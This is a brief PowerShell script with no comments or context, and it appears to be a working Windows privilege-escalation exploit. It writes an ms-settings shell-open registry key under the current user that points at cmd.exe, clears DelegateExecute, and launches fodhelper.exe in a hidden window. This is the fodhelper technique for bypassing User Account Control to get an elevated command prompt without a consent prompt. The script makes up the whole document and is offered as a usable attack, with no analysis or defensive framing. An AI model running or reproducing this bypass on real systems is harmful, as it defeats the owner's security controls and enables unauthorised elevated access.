$registryPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
New-Item -Path $registryPath -Force | Out-Null
New-ItemProperty -Path $registryPath -Name "(default)" -Value "cmd.exe /c start cmd.exe" -PropertyType String -Force | Out-Null
New-ItemProperty -Path $registryPath -Name "DelegateExecute" -Value "" -PropertyType String -Force | Out-Null

Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden